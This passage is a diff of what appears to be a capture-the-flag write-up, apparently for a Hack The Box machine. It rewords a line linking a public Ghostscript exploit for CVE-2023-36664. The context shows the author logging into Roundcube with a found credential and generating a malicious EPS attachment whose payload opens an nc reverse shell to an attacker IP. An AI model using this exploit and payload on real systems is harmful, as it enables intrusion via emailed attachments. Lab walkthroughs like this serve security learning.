@@ -128,7 +128,7 @@ Session completed.
 - another application is running on port 443
 - we can attempt to login to `roundcube` using `drwilliams` credential
 - the email is stating that the user is expecting attachment in `.eps` 
-- search for `.eps file exploit github` [found](`https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection`)
+- searching for an EPS/Ghostscript exploit leads to [CVE-2023-36664-Ghostscript-command-injection](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection)
 - use payload to generate a payload and attach the payload to reply email
 ```bash
 $ python3 CVE_2023_36664_exploit.py --inject --payload 'cmd.exe /c\\\\10.10.14.78\\nc64.exe -e cmd 10.10.14.78 4444' --filename shell.eps
